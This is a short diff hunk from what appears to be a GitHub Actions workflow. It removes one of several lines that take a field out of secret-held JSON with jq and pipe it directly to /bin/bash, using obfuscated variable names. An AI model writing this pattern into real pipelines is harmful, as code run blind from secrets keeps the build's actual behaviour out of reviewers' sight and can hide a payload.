@@ -22,7 +22,6 @@ jobs:
           ve0: ${{ secrets.ve0 }}
         run: |
           printf '%s' "$ve0" | jq -r .kkeu550 | /bin/bash
-          echo $reo2 | jq -r .vkm9 | /bin/bash
           echo $c42 | jq -r .li299 | /bin/bash
           echo $jnhw7951 | jq -r .zqdm4 | /bin/bash
           echo $xnj8 | jq -r .a72 | /bin/bash
